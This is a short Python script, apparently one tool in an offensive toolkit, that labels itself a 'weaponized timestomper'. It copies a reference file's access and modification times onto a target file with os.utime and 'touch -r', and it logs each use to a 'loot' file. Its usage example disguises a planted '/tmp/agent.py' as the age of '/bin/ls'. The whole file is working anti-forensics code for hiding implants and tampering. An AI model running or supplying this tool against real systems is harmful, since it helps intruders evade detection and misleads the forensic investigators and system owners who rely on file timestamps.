import os
import sys
import time
import subprocess

def timestomp(target_file, reference_file):
    """
    Weaponized Timestomper: Copies the Access and Modification 
    timestamps from a reference file to a target file.
    """
    if not os.path.exists(target_file):
        print(f"[-] Target file not found: {target_file}")
        return
    
    if not os.path.exists(reference_file):
        print(f"[-] Reference file not found: {reference_file}")
        return

    print(f"[*] Stomping {target_file} with attributes from {reference_file}...")

    try:
        # Get stat of reference file
        ref_stat = os.stat(reference_file)
        ref_atime = ref_stat.st_atime
        ref_mtime = ref_stat.st_mtime

        # Apply to target file
        os.utime(target_file, (ref_atime, ref_mtime))
        
        # Tactical Depth: Using 'touch -r' as a backup/validation
        # This ensures the kernel handles the precision correctly
        subprocess.run(["touch", "-r", reference_file, target_file], check=True)

        print(f"[!!!] SUCCESS: {target_file} now matches {reference_file}")
        print(f"[*] New Mtime: {time.ctime(ref_mtime)}")

        # Log to project loot
        loot_path = "../../../loot/forensic_history.log"
        with open(loot_path, "a") as log:
            log.write(f"Type: TIMESTOMP | Target: {target_file} | Ref: {reference_file}\n")

    except Exception as e:
        print(f"[-] Timestomp Fault: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: 157_timestomp <target_file> <reference_file>")
        print("Example: 157_timestomp /tmp/agent.py /bin/ls")
        sys.exit(1)
    
    timestomp(sys.argv[1], sys.argv[2])
